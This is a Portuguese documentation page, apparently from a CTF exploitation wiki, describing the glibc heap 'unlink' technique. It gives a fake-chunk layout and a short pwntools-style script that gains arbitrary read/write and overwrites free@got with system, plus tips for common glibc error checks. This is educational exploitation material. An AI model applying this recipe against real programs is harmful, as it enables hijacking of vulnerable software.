---
title: "Unlink"
sidebar_position: 8
---

Escrita via consolidação de chunks: ao liberar um chunk cujo vizinho "parece" livre, o `free` tira o vizinho da lista com `unlink`, que faz `fd->bk = bk; bk->fd = fd`. Com um chunk falso e ponteiros escolhidos, isso vira uma escrita. Funciona em **qualquer glibc**, mas só em chunks fora do tcache/fastbin (> `0x80`, ou > `0x410` com tcache cheio). Teoria em [Unlink](../../../pwning/heap/unlink.mdx).

Pré-requisitos: um **ponteiro global** para o chunk `P` (array de notas na `.bss`, endereço conhecido → sem PIE ou com leak) e um overflow de `P` para o chunk seguinte.

## Receita

```
P = alloc(0x80)         # chunk de 0x90, em ptr[0]
Q = alloc(0x80)         # vítima: será liberada
ptr = &ptr[0]           # endereço global que aponta para P (ex: elf.sym['notes'])

Dentro de P (chunk falso de 0x80, começando nos dados de P):
  [0x00] prev_size = 0
  [0x08] size      = 0x81            # tamanho do falso
  [0x10] fd        = ptr - 0x18      # fd->bk == ptr  → passa a checagem
  [0x18] bk        = ptr - 0x10      # bk->fd == ptr
  ...
Overflow em Q (header):
  prev_size = 0x80                   # distância até o chunk falso
  size      = 0x90                   # PREV_INUSE = 0: "o anterior está livre"

free(Q)  → consolida com o falso → unlink(falso) → ptr[0] = ptr - 0x18
```

Agora `ptr[0]` aponta para 0x18 bytes antes do próprio array de ponteiros. **Editar a nota 0 sobrescreve o array**: coloque `ptr[0] = alvo` e edite de novo para escrever em `alvo`; ou `ptr[0] = puts@got` e leia para vazar a libc. É uma leitura/escrita arbitrária reutilizável.

```py
fake  = p64(0) + p64(0x81) + p64(ptr - 0x18) + p64(ptr - 0x10)
fake  = fake.ljust(0x80, b'A')
fake += p64(0x80) + p64(0x90)          # prev_size e size de Q
edit(0, fake)
free(1)                                # unlink → ptr[0] = ptr - 0x18
edit(0, b'A' * 0x18 + p64(elf.got['free']))   # ptr[0] = free@got
edit(0, p64(libc.sym['system']))       # free@got = system
```

Erros: `corrupted double-linked list` → `fd->bk`/`bk->fd` não apontam para `P` (o ponteiro global tem que apontar exatamente para o início dos dados de `P`). `corrupted size vs. prev_size` (glibc ≥ 2.26) → o `size` do falso tem que bater com o `prev_size` de Q.
